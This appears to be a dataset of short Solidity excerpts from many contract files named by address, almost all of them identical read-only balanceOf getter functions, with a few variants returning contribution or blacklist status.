<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="66" endline="68" pcid="4401">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="63" endline="65" pcid="291">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="63" endline="65" pcid="4254">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="68" endline="70" pcid="6198">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="63" endline="65" pcid="8378">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="62" endline="64" pcid="1308">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="66" endline="68" pcid="1830">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="62" endline="64" pcid="6263">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="62" endline="64" pcid="4060">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="94" endline="96" pcid="913">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="137" endline="139" pcid="613">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="65" endline="67" pcid="2287">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="63" endline="65" pcid="3132">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="64" endline="66" pcid="1928">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="67" endline="69" pcid="2657">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="66" endline="68" pcid="7590">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="66" endline="68" pcid="7486">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="63" endline="65" pcid="5703">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="66" endline="68" pcid="4705">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="63" endline="65" pcid="2358">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="66" endline="68" pcid="7539">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="682" endline="684" pcid="2213">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="65" endline="67" pcid="3666">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="64" endline="66" pcid="1182">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="63" endline="65" pcid="3470">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="64" endline="66" pcid="1523">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="66" endline="68" pcid="4629">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="63" endline="65" pcid="7928">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="30" endline="32" pcid="6696">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="69" endline="71" pcid="8736">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="66" endline="68" pcid="7635">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="136" endline="138" pcid="6728">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="138" endline="140" pcid="7078">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb90ffbb2b6b1534d67bf98c05e00be06e2a6672d.sol" startline="41" endline="43" pcid="6695">
    function checkContribution(address user) public view returns (uint256) {
        return buyers[user];
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="66" endline="68" pcid="2625">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="66" endline="68" pcid="1243">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="63" endline="65" pcid="6303">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="67" endline="69" pcid="989">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="61" endline="63" pcid="4030">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="66" endline="68" pcid="329">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="63" endline="65" pcid="1160">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="61" endline="63" pcid="3343">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="61" endline="63" pcid="3788">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="63" endline="65" pcid="8228">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="66" endline="68" pcid="1580">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="66" endline="68" pcid="803">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="63" endline="65" pcid="5432">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="62" endline="64" pcid="3883">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="63" endline="65" pcid="2064">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="63" endline="65" pcid="276">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="66" endline="68" pcid="6213">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="62" endline="64" pcid="8182">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="66" endline="68" pcid="2975">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="30" endline="32" pcid="1534">
    function balanceOf(address account) public view returns (uint256) {
        return y[account];
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="62" endline="64" pcid="4826">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="64" endline="66" pcid="3548">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="65" endline="67" pcid="6762">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="66" endline="68" pcid="8438">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="32" endline="34" pcid="6287">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="63" endline="65" pcid="5658">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="66" endline="68" pcid="8751">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="65" endline="67" pcid="7471">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="67" endline="69" pcid="9128">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="63" endline="65" pcid="4871">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="64" endline="66" pcid="5574">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="64" endline="66" pcid="6248">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="59" endline="61" pcid="3838">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="63" endline="65" pcid="2749">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="62" endline="64" pcid="925">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="66" endline="68" pcid="159">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="61" endline="63" pcid="8033">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="66" endline="68" pcid="1681">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5a22929448bd37ec49ced7b63fe01e0edac652ef.sol" startline="28" endline="30" pcid="3396">
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="65" endline="67" pcid="5909">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="62" endline="64" pcid="8243">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="68" endline="70" pcid="3117">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="136" endline="138" pcid="3937">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="64" endline="66" pcid="547">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="67" endline="69" pcid="2049">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="63" endline="65" pcid="7501">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="65" endline="67" pcid="2015">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="584" endline="586" pcid="4558">
    function balanceOf(address account) external view returns (uint256) {
        return buyers[account];
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="436" endline="438" pcid="7770">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="63" endline="65" pcid="6868">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="60" endline="62" pcid="5031">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="63" endline="65" pcid="5417">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="64" endline="66" pcid="4106">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="63" endline="65" pcid="6684">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="60" endline="62" pcid="5001">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="64" endline="66" pcid="714">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="63" endline="65" pcid="8333">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="68" endline="70" pcid="7340">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="22" endline="24" pcid="3628">
    function balanceOf(address account) public view returns (uint256) {
        return b[account];
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="62" endline="64" pcid="5863">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="61" endline="63" pcid="895">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="62" endline="64" pcid="359">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="67" endline="69" pcid="2463">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="67" endline="69" pcid="8706">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="21" endline="23" pcid="6651">
    function balanceOf(address account) public view returns (uint256) {
        return b[account];
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="71" endline="73" pcid="8766">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="61" endline="63" pcid="6348">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="59" endline="61" pcid="6909">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="62" endline="64" pcid="6984">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="66" endline="68" pcid="3596">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="66" endline="68" pcid="4674">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="66" endline="68" pcid="9228">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="62" endline="64" pcid="3323">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="46" endline="48" pcid="785">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="60" endline="62" pcid="3726">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="65" endline="67" pcid="6777">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="61" endline="63" pcid="2509">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="61" endline="63" pcid="6515">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="66" endline="68" pcid="4644">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="62" endline="64" pcid="4301">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="67" endline="69" pcid="7249">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="64" endline="66" pcid="4490">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="130" endline="132" pcid="4898">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="63" endline="65" pcid="4690">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="61" endline="63" pcid="5482">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="64" endline="66" pcid="7456">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="67" endline="69" pcid="7943">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="66" endline="68" pcid="7575">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="63" endline="65" pcid="7788">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="64" endline="66" pcid="5628">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="63" endline="65" pcid="1610">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="59" endline="61" pcid="2232">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="63" endline="65" pcid="5829">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="271" endline="273" pcid="3365">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="30" endline="32" pcid="104">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="59" endline="61" pcid="2719">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="26" endline="28" pcid="5341">
    function balanceOf(address account) public view returns (uint256) {
        return b[account];
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="66" endline="68" pcid="6642">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="682" endline="684" pcid="4091">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="62" endline="64" pcid="6537">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="66" endline="68" pcid="1110">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="64" endline="66" pcid="6425">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="61" endline="63" pcid="4284">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="62" endline="64" pcid="7650">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="68" endline="70" pcid="50">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="67" endline="69" pcid="4346">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="65" endline="67" pcid="226">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="66" endline="68" pcid="4416">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="137" endline="139" pcid="4167">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="433" endline="435" pcid="7019">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="35" endline="37" pcid="4616">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="64" endline="66" pcid="4726">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="65" endline="67" pcid="5514">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="62" endline="64" pcid="3904">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="62" endline="64" pcid="6118">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
